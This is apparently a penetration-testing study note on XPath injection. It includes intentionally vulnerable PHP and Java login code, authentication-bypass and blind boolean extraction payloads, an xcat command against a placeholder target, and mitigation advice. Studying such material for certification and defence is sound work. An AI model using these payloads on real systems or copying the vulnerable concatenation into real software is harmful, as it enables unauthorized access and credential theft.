2026-02-04 17:55

Status:

Tags: [[eWPTX]] [[XML]]
###### Prerequisites: [[XML Injection - Attack Types]]
# XPath Injection

## Overview

XPath injection occurs when untrusted input is inserted into an XPath query used to search an XML document. It is conceptually identical to SQL injection, but targets XML data stores instead of relational databases.

## Target XML Document

```xml
<?xml version="1.0"?>
<users>
  <user>
    <username>admin</username>
    <password>s3cr3t</password>
    <role>administrator</role>
  </user>
  <user>
    <username>john</username>
    <password>pass123</password>
    <role>user</role>
  </user>
  <user>
    <username>jane</username>
    <password>hunter2</password>
    <role>user</role>
  </user>
</users>
```

## Vulnerable Code

**PHP:**
```php
$username = $_POST['username'];
$password = $_POST['password'];

$xpath = "//users/user[username='" . $username . "' and password='" . $password . "']";
$result = $xml->xpath($xpath);

if ($result) {
    echo "Login successful";
}
```

**Java:**
```java
String query = "//users/user[username='" + username + "' and password='" + password + "']";
XPathExpression expr = xpath.compile(query);
NodeList nodes = (NodeList) expr.evaluate(doc, XPathConstants.NODESET);
```

## Authentication Bypass Payloads

**Basic bypass (in username field):**
```
' or '1'='1
```
Resulting query: `//users/user[username='' or '1'='1' and password='anything']`

**Full bypass (both fields):**
```
Username: ' or '1'='1
Password: ' or '1'='1
```
Query: `//users/user[username='' or '1'='1' and password='' or '1'='1']`
Returns all users -- first match logs in (usually admin).

**Target specific user:**
```
admin' or '1'='1
```
Query: `//users/user[username='admin' or '1'='1' and password='...']`

**Comment-style termination (if supported):**
```
admin']%00
```

## Data Extraction

**Extract all usernames:**
```
' or 1=1]/username | //nothing['
```

**Using `string-length()` to probe field lengths:**
```
' or string-length(//users/user[1]/password)=6 or '1'='2
```
Returns true if first user's password is 6 characters.

**Using `substring()` to extract character-by-character:**
```
' or substring(//users/user[1]/password,1,1)='s' or '1'='2
```
Returns true if the first character of the first user's password is 's'.

## Blind XPath Injection

When the application does not return query results directly, use boolean-based extraction (same logic as blind SQLi).

**Step 1: Determine node count**
```
' or count(//users/user)=3 or '1'='2       --> true (3 users)
' or count(//users/user)=4 or '1'='2       --> false
```

**Step 2: Determine string length**
```
' or string-length(//users/user[1]/password)>4 or '1'='2   --> true
' or string-length(//users/user[1]/password)>6 or '1'='2   --> false
' or string-length(//users/user[1]/password)=6 or '1'='2   --> true (length is 6)
```

**Step 3: Extract characters one by one**
```
' or substring(//users/user[1]/password,1,1)='s' or '1'='2   --> true
' or substring(//users/user[1]/password,2,1)='3' or '1'='2   --> true
' or substring(//users/user[1]/password,3,1)='c' or '1'='2   --> true
...
```
Recovered password: `s3cr3t`

## XPath vs SQL Injection Comparison

| Aspect               | SQL Injection         | XPath Injection          |
|----------------------|----------------------|--------------------------|
| Data store           | Relational database  | XML document             |
| Union-based          | UNION SELECT         | `|` (union operator)     |
| Comments             | `--`, `/* */`        | None in XPath 1.0        |
| Boolean blind        | AND 1=1              | or '1'='1'               |
| String extraction    | SUBSTRING()          | substring()              |
| No types/roles       | DB permissions apply  | Full document access     |
| Stacked queries      | Possible (some DBs)  | Not possible             |

Key difference: XPath has **no access controls**. A successful injection always yields access to the entire XML document. There is no equivalent of database users or table permissions.

## Tooling

**xcat** -- automated blind XPath extraction:
```bash
# Install
pip install xcat

# Run
xcat --method POST --body "username=*&password=test" \
     --true-string "Login successful" \
     http://target/login
```

xcat automates the substring/string-length brute force process and supports XPath 2.0 features where available.

## Mitigation

**Parameterized XPath queries (Java):**
```java
// Using XPath variables instead of string concatenation
XPathFactory factory = XPathFactory.newInstance();
XPath xpath = factory.newXPath();

// Set variable resolver
xpath.setXPathVariableResolver(v -> {
    if (v.getLocalPart().equals("username")) return username;
    if (v.getLocalPart().equals("password")) return password;
    return null;
});

String query = "//users/user[username=$username and password=$password]";
XPathExpression expr = xpath.compile(query);
```

**Input validation:**
- Reject or escape XPath special characters: `'`, `"`, `/`, `[`, `]`, `(`, `)`, `=`
- Whitelist expected input patterns (alphanumeric only for usernames)
- Never concatenate user input into XPath expressions directly

**Architecture:**
- Prefer a relational database with parameterized queries over XML flat-file storage
- If XML is required, use a dedicated XML database (BaseX, eXist-db) with proper parameterization support
